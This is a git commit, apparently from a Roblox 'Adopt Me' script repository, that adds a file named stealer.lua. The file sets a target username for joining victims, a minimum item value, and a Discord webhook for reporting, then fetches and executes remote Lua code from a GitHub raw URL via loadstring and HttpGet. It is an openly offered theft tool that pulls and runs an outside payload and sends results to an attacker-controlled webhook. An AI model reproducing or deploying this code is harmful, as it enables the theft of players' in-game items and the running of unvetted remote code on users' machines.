96a29c9e941b629fe22243a73a570b50568b49e9
Adopt-me-Best-script <xenoexecutorontop@gmail.com>
2025-04-30 22:45:35 +0300

    Add files via upload

---
+++ stealer.lua
@@ -0,0 +1,6 @@
+_G.Username = "wdwdewfewd" -- user you join victim on
+_G.min_rap = 100
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1367196437993099325/rsrx6jf39NBNJ4Ej9fVupFrmHY5KBpFRw2qo70esdwwf-e8oghuVdn9O8G-HYdfqG2V_" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Adopt-me-Best-script/2rf2regerg/refs/heads/main/source.lua"))()
